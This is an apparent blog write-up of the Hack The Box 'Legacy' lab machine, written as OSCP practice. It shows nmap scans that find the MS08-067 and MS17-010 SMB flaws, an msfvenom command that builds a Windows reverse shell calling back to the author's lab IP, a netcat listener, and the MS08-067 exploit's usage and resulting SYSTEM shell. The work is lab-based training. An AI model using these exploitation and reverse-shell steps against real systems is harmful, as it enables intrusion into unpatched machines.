<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="d ago"><meta name="hour-prompt" content="hr ago"><meta name="minute-prompt" content="min ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB: Legacy" /><meta name="author" content="Nullprism" /><meta property="og:locale" content="en" /><meta name="description" content="Intro" /><meta property="og:description" content="Intro" /><link rel="canonical" href="https://blog.nullprism.io//posts/htb-legacy/" /><meta property="og:url" content="https://blog.nullprism.io//posts/htb-legacy/" /><meta property="og:site_name" content="Nullprism" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-03T22:10:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB: Legacy" /><meta name="twitter:site" content="@nullprism" /><meta name="twitter:creator" content="@Nullprism" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Nullprism"},"headline":"HTB: Legacy","dateModified":"2021-08-04T21:33:22-05:00","datePublished":"2021-08-03T22:10:00-05:00","url":"https://blog.nullprism.io//posts/htb-legacy/","description":"Intro","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.nullprism.io//posts/htb-legacy/"},"@context":"https://schema.org"}</script><title>HTB: Legacy | Nullprism</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Nullprism"><meta name="application-name" content="Nullprism"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="http://wonderworlds.org/images/crystal_fantasy/fantasy-crystal-goldwater1.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Nullprism</a></div><div class="site-subtitle font-italic">Yet Another Cybersecurity Blog. But its more for me, than you.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nullprism" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/nullprism" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['nullprism','nullprism.io'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB: Legacy</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB: Legacy</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Nullprism </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Aug 3, 2021, 10:10 PM -0500" >Aug 3<i class="unloaded">2021-08-03T22:10:00-05:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 4, 2021, 9:33 PM -0500" >Aug 4<i class="unloaded">2021-08-04T21:33:22-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1310 words">7 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 200'%3E%3C/svg%3E" data-proofer-ignore data-src="/assets/img/htb/legacy/legacy_title_card.png" class="preview-img" alt="Legacy Title Card" width="500" height="200"><h2 id="intro">Intro</h2><p>So I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community consensus seems to be that TJNull’s list of <a href="https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#vulnerable-machines">“OSCP-like”</a> boxes is excellent prep. So I figured I’d start with that. Its broken down by Linux and Windows. I always feel more comfortable on Linux than I do Windows, so I’m going to start doing all the Windows ones first.</p><h2 id="initial-engagement--enumeration">Initial Engagement &amp; Enumeration</h2><p>Started with a general reconnaissance and services scan via <a href="https://github.com/codingo/Reconnoitre">reconnoitre</a>. I’d actually stumbled on this tool a while back when I was looking for enumeration and initial engagement automation frameworks. I’ve used it a lot since then, and I’m thrilled its in play for OSCP. <a href="https://twitter.com/codingo_">Codingo</a> did an excellent job with it. Its full capabilities won’t likely be seen on this box, as the enumeration path is pretty straightforward, but it’ll show its value later on, I have no doubt.</p><h3 id="reconnoitre">Reconnoitre</h3><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>reconnoitre <span class="nt">-t</span> 10.129.192.174 <span class="nt">-o</span> <span class="nb">.</span> <span class="nt">--services</span>
</pre></table></code></div></div><h3 id="scan-results">Scan Results</h3><p><img data-proofer-ignore data-src="/assets/img/htb/legacy/legacy_scan_results.png" alt="Scan Results" /></p><p>Initial scan reveals the box to be:</p><ul><li>Hostname: Legacy<li>Windows XP (2000 Lan Manager)<li>Likely on SMBv2</ul><h2 id="enumeration">Enumeration</h2><h3 id="initial-assessment">Initial Assessment</h3><p>Port 445 is open. Given the OS version and likely patch level of the OS, and lack of other open services, SMB is likely fertile ground for an exploitation vector to gain a foothold on this box. Let’s execute some vulnerability scanning functionality within nmap to see if we can find a viable pathway.</p><h3 id="using-nmap-to-check-for-smb-vulnerabilities">Using NMAP to check for SMB Vulnerabilities</h3><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># I recoommend running this with root privileges, so if you aren't root, sudo</span>
nmap <span class="nt">--script</span> smb-vuln<span class="k">*</span> <span class="nt">-p</span> 445 <span class="nt">-oA</span> nmap/smb_vulns 10.129.192.174
</pre></table></code></div></div><p>Vulnerability scans return two intersting findings: <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067">MS08-067</a>, and <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">MS17-010</a>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</pre></table></code></div></div><h2 id="exploitation">Exploitation</h2><h3 id="finding-an-exploit">Finding an Exploit</h3><p>I generally believe in following the path of least resistance whenever possible, and <code class="language-plaintext highlighter-rouge">MS08-67</code> is one of the more famous exploits. I think everyone in the world uses jovoi’s POC of the exploit, found on their GitHub <a href="https://github.com/jivoi/pentest">here</a>. Considering the age of the POC against our current Attack Platform version (Kali 2021.1 at the time of this article), we will likely need to do some python2 and python3 juggling. I’ll link my finalized exploit code later on.</p><p>Reading through the POC, we will need to generate our own unique reverse shell payload. I prefer reverse shells whenever possible, as target firewalls are generally more permissive outbound, than inbound (less logging generally, too).</p><h3 id="generating-shellcode">Generating Shellcode</h3><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.142 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">40"</span> <span class="nt">-f</span> py <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows
</pre></table></code></div></div><p>Thankfully the POC is well documented for what it wants for shellcode, but to break this down a bit:</p><ul><li>Windows Reverse TCP shell payload<li>Call back to me on port 4443 (I try to pick ports over 1000 whenever possible)<li>If the shell exits, keep the program running (hence the thread)<li>Give it to me in Python format (saves you time reformatting)<li>x86 architecture</ul><p><img data-proofer-ignore data-src="/assets/img/htb/legacy/legacy_shellcode_gen.png" alt="Shellcode Generation" /></p><h3 id="some-sc-generation-quirks">Some SC Generation Quirks</h3><p>I did screw up and forget to pass the <code class="language-plaintext highlighter-rouge">-v</code> flag, allowing me to rename the buf variable to shellcode. So I reran <code class="language-plaintext highlighter-rouge">msfvenom</code> but I didn’t take a new screenshot.</p><h3 id="converting-from-python2-to-python3">Converting from Python2 to Python3</h3><p>After inserting the new shellcode, I <em>really</em> didn’t feel like dealing with python2 dependencies, so I converted the python2 syntax of the POC to python3 with <a href="https://docs.python.org/3/library/2to3.html">2to3</a>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>2to3 <span class="nt">-w</span> MS08-067.py
</pre></table></code></div></div><h3 id="finalizing-the-code">Finalizing the Code</h3><p>With the code patched the have relevant shellcode, and migrated from python2 to python3, it’s ready to execute. If you are looking for my finalized exploit code for MS08-67, it is hosted on my github <a href="https://github.com/nullprism/htb-boxes/tree/main/legacy">here</a>.</p><h3 id="executing-the-exploit">Executing the Exploit</h3><p>Executing the script yields some help and targeting context:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Usage: MS08-067.py &lt;target ip&gt; &lt;os #&gt; &lt;Port #&gt;

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

FYI: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
</pre></table></code></div></div><p>Based on the output, I’m pretty sure that script by nmap was run in our catch all earlier, but I’ll double check.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p</span> 139,445 <span class="nt">--script-args</span><span class="o">=</span><span class="nv">unsafe</span><span class="o">=</span>1 <span class="nt">--script</span> /usr/share/nmap/scripts/smb-os-discovery 10.129.192.174 <span class="nt">-Pn</span>
</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 21:14 CDT
Nmap scan report for 10.129.192.174
Host is up (0.053s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-08-09T07:12:11+03:00
</pre></table></code></div></div><h3 id="selecting-a-target-framework">Selecting a Target Framework</h3><p>It was. So my target options here are 1, 5, 6, 7. I feel safe in ruling out the French language pack (#5), and the AlwaysOn option (#7). I typically shy away from Universal options, so let’s try 6 first, and if that fails, we can try 1.</p><h3 id="setting-up-a-listener">Setting Up a Listener</h3><p>First, let’s set up our catcher:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-lnvp</span> 4443
</pre></table></code></div></div><h3 id="shell">Shell</h3><p>After a VPN output mid-exploit, forcing me to reconnect and reset the box, success.</p><p><img data-proofer-ignore data-src="/assets/img/htb/legacy/legacy_shell_callback.png" alt="Shell Callback" /></p><h2 id="post-exploitation">Post-Exploitation</h2><h3 id="entry">Entry</h3><pre><code class="language-cmd">C:\WINDOWS\system32&gt;whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32&gt;echo %computername%\%username%
echo %computername%\%username%
LEGACY\%username%

C:\WINDOWS\system32&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

        Connection-specific DNS Suffix  . : .htb
        IP Address. . . . . . . . . . . . : 10.129.192.181
        Subnet Mask . . . . . . . . . . . : 255.255.0.0
        Default Gateway . . . . . . . . . : 10.129.0.1

C:\WINDOWS\system32&gt;
</code></pre><h3 id="legacy-os-quirks">Legacy OS Quirks</h3><p>You can be like me and forget you are on Windows XP, it is old after all, and type <code class="language-plaintext highlighter-rouge">whoami</code>. It doesn’t exist on XP. I was able to enumerate the host name, but not the username with system variables in the cmd shell. After some research, I discovered you could pull <code class="language-plaintext highlighter-rouge">whoami.exe</code> onto the box if you really needed to know which user you are, but its well-documented that this exploit lands you as <strong>NT AUTHORITY\SYSTEM</strong>.</p><h3 id="privilege-escalation">Privilege Escalation</h3><p>Long story, short; we don’t need to bother with privilege escalation. We can go straight for the flags.</p><h3 id="flags">Flags</h3><p><img data-proofer-ignore data-src="/assets/img/htb/legacy/legacy_user_flag.png" alt="User Flag" /></p><p><img data-proofer-ignore data-src="/assets/img/htb/legacy/legacy_root_flag.png" alt="Root Flag" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oscp-like/" class="post-tag no-text-decoration" >oscp-like</a> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >oscp prep</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/legacy/" class="post-tag no-text-decoration" >legacy</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/ms08-067/" class="post-tag no-text-decoration" >ms08-067</a> <a href="/tags/msfvenom/" class="post-tag no-text-decoration" >msfvenom</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/reconnoitre/" class="post-tag no-text-decoration" >reconnoitre</a> <a href="/tags/2to3/" class="post-tag no-text-decoration" >2to3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB: Legacy - Nullprism&url=https://blog.nullprism.io//posts/htb-legacy/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB: Legacy - Nullprism&u=https://blog.nullprism.io//posts/htb-legacy/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB: Legacy - Nullprism&url=https://blog.nullprism.io//posts/htb-legacy/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-devel/">HTB: Devel</a><li><a href="/posts/htb-legacy/">HTB: Legacy</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/oscp-like/">oscp-like</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/nmap/">nmap</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-devel/"><div class="card-body"> <span class="timeago small" >Aug 4<i class="unloaded">2021-08-04T21:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Devel</h3><div class="text-muted small"><p> Intro I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community consen...</p></div></div></a></div><div class="card"> <a href="/posts/htb-jerry/"><div class="card-body"> <span class="timeago small" >Aug 9<i class="unloaded">2021-08-09T15:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Jerry</h3><div class="text-muted small"><p> Intro I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community consen...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blue/"><div class="card-body"> <span class="timeago small" >Aug 13<i class="unloaded">2021-08-13T16:36:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Blue</h3><div class="text-muted small"><p> Intro While ultimately not a challenging box - my frustrations were mostly with my own tooling. The python2/python3 split and slow deprecation of python2 has created huge amounts of annoyance. I t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/htb-devel/" class="btn btn-outline-primary" prompt="Newer"><p>HTB: Devel</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/nullprism">Nullprism</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/oscp-like/">oscp like</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/nmap/">nmap</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blog.nullprism.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer 